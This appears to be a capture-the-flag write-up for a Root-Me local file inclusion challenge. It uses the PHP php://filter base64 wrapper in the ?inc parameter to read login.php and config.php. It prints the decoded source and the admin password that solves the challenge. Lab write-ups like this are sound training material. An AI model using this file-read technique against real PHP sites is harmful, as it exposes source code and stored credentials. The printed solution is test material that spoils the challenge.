# PHP - Filters (lfi,php://filter/convert.base64-encode/resource)



The PHP Filter Extension

PHP filters are used to validate and sanitize external input. The PHP filter extension has many of the functions needed for checking user input, and is designed to make data validation easier and quicker.

The filter\_list() function can be used to list what the PHP filter extension offers:

***

click the home button, observe the url:

http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php

You see ?inc ?page ?include ?file etc

you should expect path inclusion:

But seems like there is some protection

So bypass:

http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php

To take login.php source code (One cannot see php code by ctrl+u)

\->

I did decode the result

```
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

\->

now it's time for config.php

http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php

And decode it

\->

```
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```
